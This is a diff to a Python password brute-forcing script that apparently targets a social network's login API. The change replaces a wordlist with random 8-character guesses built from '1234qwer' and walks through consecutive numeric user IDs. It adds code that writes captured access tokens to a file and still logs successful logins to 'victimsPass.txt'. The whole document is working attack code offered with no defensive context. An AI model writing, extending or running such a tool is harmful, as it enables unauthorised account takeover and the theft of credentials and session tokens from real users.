@@ -1,5 +1,5 @@
 import hashlib,requests,json,os
-from threading import Thread
+import random
 uid = []
 def init(user,pas):
 	id = user
@@ -39,15 +39,20 @@ def init(user,pas):
 			name = sa['name']
 			uid.append(vid)
 			uid.append(name)
+			open('access_token','w').write(a['access_token'])
 			return str('\033[32m\033[1mCorrect Password\033[0m')
 	except KeyError:
 		return str('\033[31m\033[1mIncorrect Password\033[0m')
-def tryhard(idg):
+def tryhard():
+	char = '1234qwer'
 	m = 1
-	for x in open('pwlist.txt','r'):
-		var = init(idg,x)
-		print(f'{[m]} {var} {x}')
-		m += 1
+	nr = 100024298102137
+	while True:
+		x = random.choices(char,k=8)
+		npn = ''.join(x)
+		var = init(nr,npn)
+		print(f'{[m]} {var} \033[36m\033[1m{npn} \033[33m\033[1m>>id: {nr}')
+		m += 1;nr += 1
 		if 'Correct Password' in var:
 			file = open('victimsPass.txt','a')
 			file.write(f"\nuser: {uid}\npass: {x}\n")
@@ -56,5 +61,5 @@ def tryhard(idg):
 		elif 'null' in var:
 			print('Calls to this api have exceeded the rate limit')
 			break
-idgp = input('Id or Gmail: ')
-tryhard(idgp)
+#idgp = input('Id or Gmail: ')
+tryhard()
